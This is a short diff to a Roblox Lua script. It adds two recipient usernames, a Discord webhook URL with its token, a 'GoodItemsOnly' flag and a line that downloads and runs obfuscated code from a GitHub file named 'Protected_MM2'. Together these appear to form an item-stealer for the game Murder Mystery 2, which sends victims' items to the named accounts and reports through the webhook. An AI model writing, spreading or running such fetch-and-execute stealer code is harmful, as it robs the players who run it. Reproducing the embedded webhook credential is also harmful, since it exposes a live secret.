@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("http://vpaste.net/FIMcw"))()
+Username = "pablogarote"
+Username2 = "evo12342jjj"
+Webhook = "https://discordapp.com/api/webhooks/1333690748993802281/bI35aJX5ix3bRb8GHjX2E5CrX0aTcoJK7ULOaAEIBAsLQ1n-NsL9Squqe0KgPEEGrVpr"
+GoodItemsOnly = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/MM2/refs/heads/main/Protected_MM2"))()
